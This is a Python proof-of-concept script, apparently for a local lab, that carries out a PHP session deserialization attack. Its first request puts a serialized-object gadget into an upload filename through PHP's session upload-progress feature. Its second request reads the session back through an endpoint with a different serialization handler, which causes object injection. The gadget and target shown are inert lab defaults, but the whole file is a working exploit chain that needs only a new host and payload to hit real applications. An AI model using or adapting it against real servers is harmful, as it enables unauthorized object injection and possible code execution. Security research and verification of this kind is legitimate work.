#!/usr/bin/env python3
"""Reproduce the php2shell handler-mismatch chain (verification only)."""
import argparse
import http.client


def upload(host, port, path, sid, filename):
    boundary = "BOUNDARY123"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    conn = http.client.HTTPConnection(host, port, timeout=10)
    conn.request(
        "POST",
        path,
        body,
        {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
            "Connection": "close",
        },
    )
    resp = conn.getresponse()
    data = resp.read().decode("latin-1", "replace")
    conn.close()
    return resp.status, dict(resp.getheaders()), data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--write-path", default="/app/upload.php")
    ap.add_argument("--read-path", default="/api/endpoint.php")
    ap.add_argument("--sid", default="mismatchlab000000000000000001")
    args = ap.parse_args()

    gadget = 'x|O:8:\\"stdClass\\":0:{}'
    print("[1] write:", args.write_path, "filename=", gadget)
    status, headers, body = upload(args.host, args.port, args.write_path, args.sid, gadget)
    print("status:", status, "content-type:", headers.get("Content-Type"))
    print(body)

    print("[2] read:", args.read_path)
    status, headers, body = upload(args.host, args.port, args.read_path, args.sid, "dummy.txt")
    print("status:", status, "content-type:", headers.get("Content-Type"))
    print(body)


if __name__ == "__main__":
    main()
